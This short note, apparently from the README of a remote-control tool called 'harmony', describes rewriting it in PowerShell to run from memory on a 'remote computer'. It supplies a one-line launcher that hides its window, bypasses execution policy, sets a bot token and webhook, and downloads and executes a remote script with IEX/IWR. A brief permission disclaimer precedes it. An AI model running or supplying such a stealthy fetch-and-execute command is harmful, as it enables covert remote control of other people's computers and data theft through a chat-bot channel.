attempt to rewrite in powershell to allow running from memory for more efficiency and auto update if using the below command on the remote computer (that you own or have permission to use this on!)

powershell -W Hidden -EP Bypass -C "$TOKEN = '<YOUR_BOT_TOKEN>'; $serverID = '<YOUR_SERVER_ID>'; $whURL = '<YOUR_WEBHOOK_URL>'; IEX (IWR 'https://example.com/harmony.ps1' -UseBasicParsing); exit"
